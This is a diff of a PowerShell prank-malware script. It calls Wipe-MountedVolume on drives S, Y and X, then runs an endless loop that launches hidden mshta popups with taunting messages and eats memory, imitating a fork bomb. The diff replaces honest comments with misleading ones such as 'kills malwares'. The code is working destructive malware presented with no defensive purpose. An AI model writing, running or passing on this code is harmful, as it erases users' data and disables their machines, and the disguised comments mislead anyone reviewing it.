@@ -47,18 +47,18 @@ Wipe-MountedVolume "S"
 Wipe-MountedVolume "Y"
 Wipe-MountedVolume "X"
 
-# Visual annoyance loop (popups + self-replicating resource consumption)
-# Note: The original %0|%0 is a crude fork bomb. In PowerShell we use a tight loop + Start-Process for similar effect.
+# RAM eater
+# OK.
 
 Write-Host "Get ready..." -ForegroundColor Red
 
 while ($true) {
-    # Spam annoying popups (repeating the same messages as original)
+    # Spam
     Start-Process mshta "javascript:var sh=new ActiveXObject('WScript.Shell'); sh.Popup('Still using this computer?', 0, 'Error', 16);close()" -WindowStyle Hidden
     Start-Process mshta "javascript:var sh=new ActiveXObject('WScript.Shell'); sh.Popup('llisT gnisU sihT retupmoC?', 0, 'Error', 16);close()" -WindowStyle Hidden
     Start-Process mshta "javascript:var sh=new ActiveXObject('WScript.Shell'); sh.Popup('Oranges are way better you silly tomato', 0, 'Error', 16);close()" -WindowStyle Hidden
 
-    # Consume memory/resources (simple way to mimic fork-bomb pressure without instant crash)
-    $null = New-Object byte[] (1MB)   # Allocate ~1MB per iteration
-    Start-Sleep -Milliseconds 50     # Adjust for intensity (lower = more aggressive)
+    # Destroy memory
+    $null = New-Object byte[] (1MB)   # Trust me bro
+    Start-Sleep -Milliseconds 50     # kills malwares
 }
